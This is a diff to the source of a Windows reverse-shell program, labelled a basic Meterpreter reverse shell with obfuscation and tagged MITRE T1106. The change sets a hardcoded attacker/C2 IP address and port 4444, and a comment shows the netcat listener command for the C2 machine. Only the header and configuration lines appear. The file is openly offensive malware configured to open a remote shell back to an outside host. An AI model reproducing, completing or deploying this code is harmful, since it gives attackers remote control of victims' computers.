@@ -1,5 +1,6 @@
 //Basic Meterpreter Reverse Shell with Obfuscation
 //Based off ActiveXSploit's "Coding a basic reverse shell" 
+//MITRE T1106
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -17,7 +18,7 @@ int main() {
     char recvserver[512];
 
     // Add Kali/C2 ip
-    //char ip_addr[] = "";
+    char ip_addr[] = "192.168.20.73";
     //nc -nvlp [port#] on c2 machine
     int port = 4444;
     int connection;
